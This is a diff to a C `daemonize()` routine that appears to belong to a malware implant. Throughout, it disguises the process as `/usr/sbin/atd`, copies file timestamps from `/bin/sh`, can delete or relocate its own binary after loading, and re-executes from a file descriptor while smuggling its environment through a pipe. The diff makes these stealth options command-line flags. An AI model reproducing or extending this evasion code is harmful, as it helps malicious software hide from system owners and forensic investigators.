@@ -9,29 +9,34 @@
 #include <utime.h>
 #include <sys/stat.h>
 #include <sys/prctl.h>
+#include <string.h>
+#include <errno.h>
 
 #ifndef DEFAULT_MTIME_FROM
-#define DEFAULT_MTIME_FROM "/bin/sh"
-#endif
-
-#ifndef DEFAULT_ENV_SA0
-#define DEFAULT_ENV_SA0 "__SA0"
-#endif
-
-#ifndef DEFAULT_ENV_SCWD
-#define DEFAULT_ENV_SCWD "__SCWD"
-#endif
-
-#ifndef DEFAULT_ENV_CLEANUP
-#define DEFAULT_ENV_CLEANUP "__CLEANUP"
-#endif
-
-#ifndef DEFAULT_ENV_MOVE
-#define DEFAULT_ENV_MOVE "__MOVE"
+ #define DEFAULT_MTIME_FROM "/bin/sh"
 #endif
 
 #ifndef DEFAULT_ARGV0
-#define DEFAULT_ARGV0 "/usr/sbin/atd"
+ #define DEFAULT_ARGV0 "/usr/sbin/atd"
+#endif
+
+#ifdef USE_ENV_ARGS
+ #ifndef DEFAULT_ENV_SA0
+  #define DEFAULT_ENV_SA0 "__SA0"
+ #endif
+
+ #ifndef DEFAULT_ENV_SCWD
+  #define DEFAULT_ENV_SCWD "__SCWD"
+ #endif
+
+ #ifndef DEFAULT_ENV_CLEANUP
+  #define DEFAULT_ENV_CLEANUP "__CLEANUP"
+ #endif
+
+ #ifndef DEFAULT_ENV_MOVE
+  #define DEFAULT_ENV_MOVE "__MOVE"
+ #endif
+
 #endif
 
 #ifndef DEFAULT_SAFE_PATH
@@ -48,7 +53,7 @@
 
 #include "daemonize.h"
 
-int daemonize(bool exit_parent) {
+int daemonize(int argc, char *argv[], char *env[], bool exit_parent) {
     pid_t pid;
     int i;
 
@@ -58,17 +63,51 @@ int daemonize(bool exit_parent) {
 
     /* Cleanup environment and reexec */
     char self[PATH_MAX] = {};
+    char *fd_str = getenv("_");
+    int fdenv = -1;
 
-    if (getenv("PATH") && readlink("/proc/self/exe", self, sizeof(self)-1) != -1) {
+    if (fd_str) {
+        char *end = NULL;
+        errno = 0;
+        fdenv = strtol(fd_str, &end, 10);
+        if ((end == fd_str) || errno) {
+            fdenv = -1;
+        }
+    }
+
+	if (fd_str && fdenv < 0 && readlink("/proc/self/exe", self, sizeof(self)-1) != -1) {
+#ifdef USE_ENV_ARGS
         char *set_argv0 = getenv(DEFAULT_ENV_SA0);
 		char *set_cwd = getenv(DEFAULT_ENV_SCWD);
 		char *cleanup = getenv(DEFAULT_ENV_CLEANUP);
 		char *move = getenv(DEFAULT_ENV_MOVE);
+        char *mtime_from = DEFAULT_MTIME_FROM;
+#else
+        char *set_argv0 = NULL;
+		char *set_cwd = NULL;
+		char *move = NULL;
+        char *mtime_from = DEFAULT_MTIME_FROM;
+
+		bool cleanup = false;
+
+        char c;
+
+        while ((c = getopt (argc, argv, "0:t:c:m:C")) != -1)
+            switch (c) {
+            case '0': set_argv0 = optarg; break;
+            case 't': mtime_from = optarg; break;
+            case 'c': set_cwd = optarg; break;
+            case 'm': move = optarg; break;
+            case 'C': cleanup = true; break;
+            };
+#endif
+
+        unsetenv("_");
 
         int fd = -1;
 
         struct stat _stat = {};
-        stat(DEFAULT_MTIME_FROM, &_stat);
+        stat(mtime_from, &_stat);
 
         if (move) {
             fd = open(self, O_RDONLY);
@@ -119,6 +158,8 @@ int daemonize(bool exit_parent) {
             fd = open(move? move:self, O_RDONLY);
         }
 
+        int envpipe[2] = {};
+
         if (fd != -1) {
             if (cleanup) {
                 unlink(move? move:self);
@@ -129,18 +170,70 @@ int daemonize(bool exit_parent) {
                 NULL
             };
 
-            char *const env[] = {NULL};
+            char fdenv_pass[PATH_MAX] = {};
+            int r = pipe(envpipe);
 
-            if (set_cwd) {
-                chdir(set_cwd? set_cwd : "/");
+            if (r == 0) {
+                snprintf(fdenv_pass, sizeof(fdenv_pass), "_=%d", envpipe[0]);
             }
 
-            fexecve(fd, argv, env);
-            /* We shouldn't be here */
-            close(fd);
+            char *const env[] = {
+                r == 0? fdenv_pass : NULL,
+                NULL
+            };
 
-            execve(move? move:self, argv, env);
+            chdir(set_cwd? set_cwd : "/");
+
+            pid_t next = fork();
+            if (next == 0 || next == -1) {
+                if (r == 0)
+                    close(envpipe[1]);
+
+                fexecve(fd, argv, env);
+                /* We shouldn't be here */
+                execve(move? move:self, argv, env);
+            }
+
+            if (r == 0)
+                close(envpipe[0]);
         }
+        close(fd);
+
+        int idx = 0;
+        for (idx=0;env[idx];idx++) {
+            unsigned int size = strlen(env[idx]);
+            int r = write(envpipe[1], &size, 4);
+            if (r != 4) {
+                break;
+            }
+            r = write(envpipe[1], env[idx], size);
+            if (r != size) {
+                break;
+            }
+        }
+        close(envpipe[1]);
+        exit(0);
+    }
+
+    if (fdenv > 0) {
+        for (;;) {
+            unsigned int size = 0;
+            int r = read(fdenv, &size, 4);
+            if (r != 4) {
+                break;
+            }
+            char envstr[PATH_MAX] = {};
+            if (size > PATH_MAX-1) {
+                break;
+            }
+            r = read(fdenv, envstr, size);
+            if (!r || r != size) {
+                break;
+            }
+            envstr[size] = '\0';
+            r = putenv(strdup(envstr));
+        }
+        close(fdenv);
     }
 
     /* Set default "safe" path */
@@ -194,10 +287,6 @@ int daemonize(bool exit_parent) {
 
     /* create new session and process group */
     if (setsid ( ) == -1)
-        return -1;
-
-    /* set the working directory to the root directory */
-    if (chdir ("/") == -1)
         return -1;
 
 #ifndef DEBUG
